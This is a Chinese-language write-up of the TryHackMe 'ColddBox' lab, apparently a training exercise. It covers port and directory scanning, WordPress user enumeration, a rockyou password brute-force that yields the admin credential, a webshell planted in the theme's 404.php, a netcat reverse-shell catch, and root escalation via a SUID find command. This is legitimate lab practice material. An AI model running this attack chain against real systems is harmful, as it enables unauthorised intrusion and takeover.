# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测
```
┌──(root💀kali)-[~/tryhackme/ColddBox]
└─# nmap -sV -Pn 10.10.165.236
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-06 08:22 EDT
Stats: 0:01:28 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Nmap scan report for 10.10.165.236
Host is up (0.31s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.75 seconds

```

只有一个http服务，打开80端口首页是一个经典的wordpress站点

## 爆破站点目录
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.165.236                                                                                  

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.165.236/_21-11-06_08-25-32.txt

Error Log: /root/dirsearch/logs/errors-21-11-06_08-25-32.log

Target: http://10.10.165.236/

[08:25:35] Starting:   
[08:26:37] 301 -    0B  - /index.php  ->  http://10.10.165.236/             
[08:26:37] 301 -    0B  - /index.php/login/  ->  http://10.10.165.236/login/
[08:26:40] 200 -   19KB - /license.txt                                      
[08:26:57] 200 -    7KB - /readme.html                                      
[08:26:59] 403 -  278B  - /server-status/                                   
[08:26:59] 403 -  278B  - /server-status                                    
[08:27:15] 301 -  317B  - /wp-admin  ->  http://10.10.165.236/wp-admin/     
[08:27:15] 302 -    0B  - /wp-admin/  ->  /wp-login.php?redirect_to=http%3A%2F%2F10.10.165.236%2Fwp-admin%2F&reauth=1
[08:27:15] 301 -  319B  - /wp-content  ->  http://10.10.165.236/wp-content/ 
[08:27:15] 200 -    0B  - /wp-content/                                      
[08:27:15] 200 -   69B  - /wp-content/plugins/akismet/akismet.php           
[08:27:15] 500 -    3KB - /wp-admin/setup-config.php                        
[08:27:15] 500 -    0B  - /wp-content/plugins/hello.php                     
[08:27:15] 200 -  777B  - /wp-content/upgrade/                              
[08:27:15] 200 -    0B  - /wp-cron.php                                      
[08:27:15] 500 -    0B  - /wp-includes/rss-functions.php                    
[08:27:15] 302 -    0B  - /wp-signup.php  ->  /wp-login.php?action=register 
[08:27:15] 200 -    0B  - /wp-config.php                                    
[08:27:15] 200 -    1B  - /wp-admin/admin-ajax.php                          
[08:27:16] 200 -    1KB - /wp-admin/install.php                             
[08:27:16] 301 -  320B  - /wp-includes  ->  http://10.10.165.236/wp-includes/
[08:27:16] 200 -   42B  - /xmlrpc.php                                       
[08:27:16] 200 -   26KB - /wp-includes/                                     
[08:27:17] 200 -    2KB - /wp-login.php                                     
                                                                             
Task Completed    
```

还是挺多wp的基本目录爆出来的，而且存在目录遍历漏洞

## wpscan挖掘wp信息
```
┌──(root💀kali)-[~/tryhackme/ColddBox]
└─# wpscan --url http://10.10.165.236/ 
WARNING: Nokogiri was built against libxml version 2.9.10, but has dynamically loaded 2.9.12
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.165.236/ [10.10.165.236]
[+] Started: Sat Nov  6 08:27:50 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.165.236/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://10.10.165.236/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.165.236/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.165.236/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.10.165.236/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.165.236/wp-content/themes/twentyfifteen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.10.165.236/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://10.10.165.236/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.165.236/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:13 <========================================================================================> (137 / 137) 100.00% Time: 00:00:13

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Nov  6 08:28:19 2021
[+] Requests Done: 186
[+] Cached Requests: 5
[+] Data Sent: 45.096 KB
[+] Data Received: 17.49 MB
[+] Memory used: 216.426 MB
[+] Elapsed time: 00:00:29
```
## wp基本信息
确认wp版本号是：```4.1.31```

枚举wp用户：```wpscan --url http://10.10.165.236 -e -U1-1000```

```
[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

爆破c0ldd密码
```
wpscan --url http://10.10.165.236 -U c0ldd -P /usr/share/wordlists/rockyou.txt

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - c0ldd /9876543210                                                                                 
```

得到wp登录凭证：```c0ldd ： 9876543210```

# 获取初始shell
登录后台，在```Apperarance->Editor```,找到404.php，把webshell写进去，保存。

监听。首页访问一个不存在的页面，触发反弹shell
```
┌──(root💀kali)-[~/tryhackme/ColddBox]
└─# nc -lnvp 1234                                                                                                                                                  2 ⨯
listening on [any] 1234 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.165.236] 39572
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:34:17 up  1:13,  0 users,  load average: 0.01, 1.77, 2.83
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```


# 提权到root
user.txt在c0ldd文件夹下，但是当前用户没有查看权限

传linpeas发现find命令是SUID，可以直接提权到root

```
www-data@ColddBox-Easy:/$ /usr/bin/find  . -exec /bin/sh -p \; -quit
/usr/bin/find  . -exec /bin/sh -p \; -quit
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# whoami
whoami
root
```

已经拿到root权限，因此我们可以拿到所有flag